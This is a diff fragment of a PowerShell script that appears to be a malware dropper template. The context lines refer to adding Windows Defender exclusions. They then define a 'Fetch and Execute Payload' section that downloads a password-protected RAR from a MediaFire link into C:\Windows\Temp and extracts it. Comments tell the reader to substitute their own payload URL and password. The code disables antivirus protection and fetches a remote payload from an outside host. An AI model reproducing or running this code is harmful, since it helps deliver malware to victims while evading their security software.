@@ -121,7 +121,7 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://www.mediafire.com/file/0l2fx4lerit9mgc/test.rar/file" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
+$payloadUrl = "https://www.mediafire.com/file/0l2fx4lerit9mgc/test.rar" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
 $payloadPath = "C:\Windows\Temp\payload.rar"
 $extractPath = "C:\Windows\Temp\PayloadExtracted"
 $rarPassword = "SUBSCRIBE" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD
